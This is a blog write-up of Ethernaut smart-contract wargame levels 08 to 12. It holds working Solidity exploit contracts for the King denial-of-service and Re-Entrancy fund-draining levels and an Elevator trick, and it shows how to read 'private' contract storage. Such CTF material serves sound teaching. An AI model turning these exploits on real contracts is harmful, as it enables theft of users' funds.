---
layout: post
title:  Ethernaut challenges writeup Part II (Challenges 08 to 12).
excerpt_separator: <!--more-->
category: DeFi
---

Hi There!. Today's post continues the saga of solutions to [Ethernaut](https://ethernaut.openzeppelin.com/). Today's post tackles challenges 08 to 12.

<!--more-->

# Challenges write up

## Vault

In this level we are presented with a contract that act as a vault. The vault is password protected and we have to obtain the password in order to unlock it. I already knew that anyone can read a contract's storage unless it is  encrypted, but before trying to solve this challenge I never tried to do it.

I wrongly assumed that the password should be in the `input data` field from the Tx that created the contract. After partially failing with this approach I decided to check for the contract's storage and quickly solved the challenge.

Note: I also found and alternative solution that you chan check in "Alternative Path" Section.

Tol solve this challenge I followed these steps:

1. Reviewed the decompiled contract in EtherScan.
2. Located the storage used to save the password.
3. Used the `getStorageAt` function to retrieve what I assumed was the pasword.
4. Unlocked the vault with the password.

```
// obtaining the password, the "1" comes from the decompiled bytecode Storage 1.
await web3.eth.getStorageAt(instance,1)

// Result
0x412076657279207374726f6e67207365637265742070617373776f7264203a29

// Ascii Decoded
web3.utils.hexToAscii("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")

// Unlocking the vault
contract.unlock("A very strong secret password :)")
```

### Alternative path

I decided to replicate the contract creating to check If I was right. I deployed the contract using Remix and used the same password than in the real scenario, you can check the deployment [here](https://rinkeby.etherscan.io/tx/0xd51c2bce1ceea0ae65dbf94161bc27aac15c42ed5d732dc74a31f963aa809128).

When checking the Tx, we can see the `input data`. According to [this](https://medium.com/@hayeah/diving-into-the-ethereum-vm-part-5-the-smart-contract-creation-process-cb7b6133b855) blog post, constructor's arguments should be appended after the contract's bytecode. I copied below the `Input Data` from the Tx creating the contract:

```
0x608060405234801561001057600080fd5b506040516101653803806101658339818101604052602081101561003357600080fd5b810190808051906020019092919050505060016000806101000a81548160ff021916908315150217905550806001819055505060f1806100746000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c8063cf309012146037578063ec9b5b3a146057575b600080fd5b603d6082565b604051808215151515815260200191505060405180910390f35b608060048036036020811015606b57600080fd5b81019080803590602001909291905050506094565b005b6000809054906101000a900460ff1681565b80600154141560b85760008060006101000a81548160ff0219169083151502179055505b5056fea26469706673582212208ffaaa9a1e4114bd75cbf9259a351e2ce227b545b6f6c9c4fe286b2b5bb5ff6464736f6c63430006000033412076657279207374726f6e67207365637265742070617373776f7264203a29
```

Looking for the string `412076657279207374726f6e67207365637265742070617373776f7264203a29` we can see that's right at the end of it!.

Based on this I assumed that checking for the Tx creating the level's Instance (0xD28a497b0419683DbAFd606a47F06b1794F55E65) in my case I should be able to see the password too. I checked that [address in Etherscan](https://rinkeby.etherscan.io/address/0xD28a497b0419683DbAFd606a47F06b1794F55E65), and looked for the [contract's creator](https://rinkeby.etherscan.io/address/0xf94b476063b6379a3c8b6c836efb8b3e10ede188): `0xf94b476063b6379a3c8b6c836efb8b3e10ede188`. As it is possible to see this is another contract. At this point I was a bit puzzled and cheated a bit. I decided to check how this was implemented in the actual code. Fortunately, [OpenZepellin has the code for the wargame in GitHub](https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/levels/VaultFactory.sol).

After looking at the code everything made perfect sense. Address `0xf94b476063b6379a3c8b6c836efb8b3e10ede188` it's the Factory contract that deployed the Vault's instance at `0xD28a497b0419683DbAFd606a47F06b1794F55E65`. Then the pasword should be somewhere in the Factory's bytecode, I proceeded to check that:

```
//https://rinkeby.etherscan.io/address/0xf94b476063b6379a3c8b6c836efb8b3e10ede188#code

0x60806040526004361061004a5760003560e01c8063715018a61461004f5780637726f776146100665780638da5cb5b146100ea578063d38def5b14610141578063f2fde38b146101ca575b600080fd5b34801561005b57600080fd5b5061006461021b565b005b6100a86004803603602081101561007c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506103a3565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156100f657600080fd5b506100ff61040b565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561014d57600080fd5b506101b06004803603604081101561016457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610434565b604051808215151515815260200191505060405180910390f35b3480156101d657600080fd5b50610219600480360360208110156101ed57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506104c5565b005b6102236106d2565b73ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16146102e4576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a360008060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550565b6000807f412076657279207374726f6e67207365637265742070617373776f7264203a2990506000816040516103d8906106da565b80828152602001915050604051809103906000f0801580156103fe573d6000803e3d6000fd5b5090508092505050919050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b6000808390508073ffffffffffffffffffffffffffffffffffffffff1663cf3090126040518163ffffffff1660e01b815260040160206040518083038186803b15801561048057600080fd5b505afa158015610494573d6000803e3d6000fd5b505050506040513d60208110156104aa57600080fd5b81019080805190602001909291905050501591505092915050565b6104cd6106d2565b73ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161461058e576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff161415610614576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602681526020018061084d6026913960400191505060405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a3806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600033905090565b610165806106e88339019056fe608060405234801561001057600080fd5b506040516101653803806101658339818101604052602081101561003357600080fd5b810190808051906020019092919050505060016000806101000a81548160ff021916908315150217905550806001819055505060f1806100746000396000f3fe6080604052348015600f57600080fd5b506004361060325760003560e01c8063cf309012146037578063ec9b5b3a146057575b600080fd5b603d6082565b604051808215151515815260200191505060405180910390f35b608060048036036020811015606b57600080fd5b81019080803590602001909291905050506094565b005b6000809054906101000a900460ff1681565b80600154141560b85760008060006101000a81548160ff0219169083151502179055505b5056fea264697066735822122089d8dcab0ee2a6e0d4b11a8b0624f50e782fb879a941ed2f1d39cad24fdf2b1c64736f6c634300060300334f776e61626c653a206e6577206f776e657220697320746865207a65726f2061646472657373a2646970667358221220ce472b7739c357ba0b30410c1e950e4baf99f852de13d447367a546c56df4da964736f6c63430006030033
```

Looking for the `412076657279207374726f6e67207365637265742070617373776f7264203a29` we can find it!.

## King

To solve this challenge I decided to create a malicious contract in a way that if it received money it can somehow "break" or revert the transaction to avoid the sender contract to continue its operation. In doing this, if we make our malicious contract "King" we achieve the goal of avoiding the possibility of other contract to reclaim kingship. I found a very interesting article [here](https://fravoll.github.io/solidity-patterns/secure_ether_transfer.html), which explains with great detail the differences between `send()`, `transfer()`, and `.call()`.

I copied the most important part for our purposes:

```
...
Regarding the propagation of exceptions, send and call.value are similar to each other, as both of them do not bubble up exceptions but rather return false in case of an error. The transfer() method, however, propagates every exception that is thrown at the receiving address to the sending contract, leading to an automatic revert of all state changes.
...
```

Based on this explanation and that in the fact that King's contract code is using `king.transfer(msg.value)`, we can determine that if our contract makes the `transfer()` function to fail, an exception will be raised and any changes will be reverted. Based on this behavior I implemented a malicious smart contract that in its `receive()` method only accepts receiving ether from an specific account. The steps followed to solve the challenge were:

1. Deploy the malicious contract and fund it with enough ether.
2. Call the `attack()` method which made our contract the new king.
3. Now, when submitting the instance the level will try to reclaim the throne. For this to happen the King contract must return the Ether sent by our contract.
4. As the malicious king (our contract) only accepts Ether from an specific address, the transfer will fail.
5. We cannot be removed as Kings.

### Solution

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    
    address payable victimKing;

    constructor(address payable _victim) {
        victimKing = _victim;
    }

    receive() external payable {
        require(msg.sender == 0x922e34D7d34C70Df760DF873BC6F99a10dea516E);
    }

    function attack() public {
        (bool success, bytes memory data)= address(victimKing).call{value: 0.01 ether, gas:0.001 ether}("");
        if (!success){
            revert();
        }
    }

}
```

## Re-Entrancy

The main issue to exploit in this challenge is in function `withdraw` as there isn't any protection mechanism against re-entrancy attacks. A malicious contract can call this function and once it receives the ether sent by the vulnerable contract in line `(bool result,) = msg.sender.call{value:_amount}("");`, execute another withdraw before its balance is updated. In this way it can drain all contract's funds.

To achieve the attack described above I created a malicious contract that in the `receive()` function it performs a `withdraw()` from the victim contract, exploiting the re-entrancy vulnerability.

Useful reminder:

```
// Call a Payable function, sending arguments (donate expects an address "player in this case" and a value in msg.value)
contract.donate(player, {from:player, value:toWei("0.0001", "ether")})
```

### Solution

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentrancyAttack {
    
    address payable victim;

    constructor(address payable _victim) {
        victim = _victim;
    }

    receive() external payable {
        IReentrance(victim).withdraw(0.001 ether);
    }

    function attack() public {
        IReentrance(victim).withdraw(0.001 ether);

    }
}
```

## Elevator

The main idea to solve this challenge is that the Elevator contract is not checking if the Building Interface is changing state. Function `isLastFloor` should never modify state as it its purpose is to return True or False based on a certain input.

I solved this challenge creating a contract that the first time the function `isLastFloor` is called it returns `false`. This allows to pass the first `if` in the code. Then when the function is called again in `top = building.isLastFloor(floor)`, it returns `true`, which sets `top` to `true`. 

### Solution

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint _floor) external;
}


contract FloorChange {
    
    bool alreadyCalled = false;
    address elevatorAddress;

    constructor(address _elevator) {
        elevatorAddress = _elevator;
    }

    function isLastFloor(uint floor) public returns (bool){
        if(alreadyCalled) {
            return true;
        } else {
            alreadyCalled = true;
            return false;
        }
    }

    function changeState(bool state) public {
        alreadyCalled = state;
    }

    function start() public {
        IElevator(elevatorAddress).goTo(1);
    }
}
```

## Privacy

I really liked playing the level. When I started I was a bit worried about its difficulty, as it is tagged as 8/10!. Fortunately I wanted to understand better how Storage worked in Solidity and have even more fun (and some headaches) than I had while solving challenge "Vault".

My first goal was to read more about how Solidity stored information at its lower level. I found very interesting articles that I summarized in the "Further Reading" Section. The most important idea that I built in my mind after going over those articles was to think about Solidity's storage as a very large array. With that in mind I wrote in a piece of paper what I believed was the storage layout of the challenge:

```
---------------------------------------------
|   |           |   |   |       |           |
|   |           |   |   |       |           | Declared Variables
---------------------------------------------
| 1 |    32     | 1 | 1 |   2   |    96     | Bytes needed
---------------------------------------------
| 0 |     1     |       2       | 3 | 4 | 5 | Solidity's Slots
---------------------------------------------   
```

This layout is based on what I understood about what Solidity does to optimize space, packing variables when it's possible. In this case our first variable `locked` it's a `bool` which needs `1 byte`. The next one `ID` is defined as `uint256` and it takes `32 bytes` leaving no other option than padding `locked` with zeros to align everything to `32 bytes` which is the size Solidity uses and consuming two slots. The next three variables `flattening`, `denomination` and `awkwardness` are defined as `uint8`, `uint8` and `uint16` taking in total `4 bytes`. This can be leveraged by the compiler to store the three of them in on slot which will be `slot 2`. Finally we have an static array which its size can be known at compile time. It's defined as three `bytes32` items which take 96 bytes. Based on this solidity will need three slots more.

To validate my assumptions I deployed the contract with known values for the `bytes32[3] data` array. You can find the contract here: `0x6Ad9b21706C398b9024389fE62F0758C7Ac06500` (Rinkeby Test Network.) I deployed it with a `bytes32[3] data =  ["0x4141414141414141414141414141414141414141414141414141414141414141","0x4242424242424242424242424242424242424242424242424242424242424242","0x4343434343434343434343434343434343434343434343434343434343434343"]`. With this contract deployed and its state known I proceeded to review the slots and compare them with the challenge contract:

```
// "unlock" variable padded to 32 bytes
await web3.eth.getStorageAt(instance,0)
'0x0000000000000000000000000000000000000000000000000000000000000001'
await web3.eth.getStorageAt("0x6Ad9b21706C398b9024389fE62F0758C7Ac06500",0)
'0x0000000000000000000000000000000000000000000000000000000000000001'

// "ID" Variable, 32 bytes
await web3.eth.getStorageAt(instance,1)
'0x000000000000000000000000000000000000000000000000000000006258a429'
await web3.eth.getStorageAt("0x6Ad9b21706C398b9024389fE62F0758C7Ac06500",1)
'0x0000000000000000000000000000000000000000000000000000000062596e02'

// "flattening", denomination, and "awkwardness". Note that flattening is at the "end".
await web3.eth.getStorageAt(instance,2)
'0x00000000000000000000000000000000000000000000000000000000a429ff0a'
await web3.eth.getStorageAt("0x6Ad9b21706C398b9024389fE62F0758C7Ac06500",2)
'0x000000000000000000000000000000000000000000000000000000006e02ff0a'

// data[0]
await web3.eth.getStorageAt(instance,3)
'0x7e13ab964fef19586574adad9136a329f934d8030eb2cfa3bf3bb2d221c2930e'
await web3.eth.getStorageAt("0x6Ad9b21706C398b9024389fE62F0758C7Ac06500",3)
'0x4141414141414141414141414141414141414141414141414141414141414141'

// data[1]
await web3.eth.getStorageAt(instance,4)
'0xacbd61b1a0236fe2df88da8f6bf8540a6b67202d69184b8c2a5b27c71e3746fa'
await web3.eth.getStorageAt("0x6Ad9b21706C398b9024389fE62F0758C7Ac06500",4)
'0x4242424242424242424242424242424242424242424242424242424242424242'

// data [2]
await web3.eth.getStorageAt(instance,5)
'0x39281414451b91c692f0519087510380db3347a313503a0ac5cb13f689fe94dc'
await web3.eth.getStorageAt("0x6Ad9b21706C398b9024389fE62F0758C7Ac06500",5)
'0x4343434343434343434343434343434343434343434343434343434343434343'
```

This validated my assumptions. The final thing to do was understand what was being used as the `key` to unlock the contract. For that I reviewed the `unlock` function. This function receives a `bytes16` (16 bytes) and compares against `bytes16(data[2]))`. This means that it takes the first sixteen bytes of what's stored in `data[2]` and uses it as a key. In our challenge this should be:

```
// This is data[2] (Storage slot 5)
data[2] = 0x39281414451b91c692f0519087510380db3347a313503a0ac5cb13f689fe94dc

// bytes16(data[2]) == 0x39281414451b91c692f0519087510380
```

With this I proceeded to test if that was the key:

```
await contract.unlock("0x39281414451b91c692f0519087510380")
await contract.locked()
false
```

Challenge Completed!.